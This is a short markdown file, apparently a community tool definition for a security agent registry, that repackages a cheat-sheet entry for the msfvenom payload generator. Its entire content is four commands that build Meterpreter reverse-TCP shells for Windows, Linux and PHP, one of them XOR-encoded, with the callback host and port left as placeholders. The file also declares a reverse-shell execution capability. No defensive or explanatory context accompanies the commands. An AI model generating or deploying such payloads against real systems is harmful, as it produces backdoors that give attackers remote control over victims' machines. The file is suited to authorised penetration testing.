---
trust_level: community
id: darkiros-msfvenom
namespace: darkiros:tool:msfvenom
name: "msfvenom"
description: "msfvenom - payload windows x86 meterpeter unstagged"
version: "1.0.0"
capabilities:
  - security.execution.reverse-shell
platforms:
  - windows
  - linux
techniques:
  - execution
execution:
  template: "msfvenom"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "msfvenom - payload windows x86 meterpeter unstagged"
    command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o [output.exe]"
  - description: "msfvenom - linux meterpeter reverse shell"
    command: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o [output.elf]"
  - description: "msfvenom - Linux x64 meterpreter reverse shell"
    command: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -t 300 -e x64/xor_dynamic -o [output.elf]"
  - description: "msfvenom - PHP meterpreter reverse shell"
    command: "msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw -o [output.php]"
references:
  - label: "Source"
    url: "https://www.metasploit.com/"
  - label: "Darkiros"
    url: "https://darkiros.github.io/commands.html"
items:
  - Shell
services:
  - HTTP
  - HTTPS
---

# msfvenom

Darkiros cheat sheet commands:

**msfvenom - payload windows x86 meterpeter unstagged**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o [output.exe]
```

**msfvenom - linux meterpeter reverse shell**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o [output.elf]
```

**msfvenom - Linux x64 meterpreter reverse shell**
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -t 300 -e x64/xor_dynamic -o [output.elf]
```

**msfvenom - PHP meterpreter reverse shell**
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw -o [output.php]
```
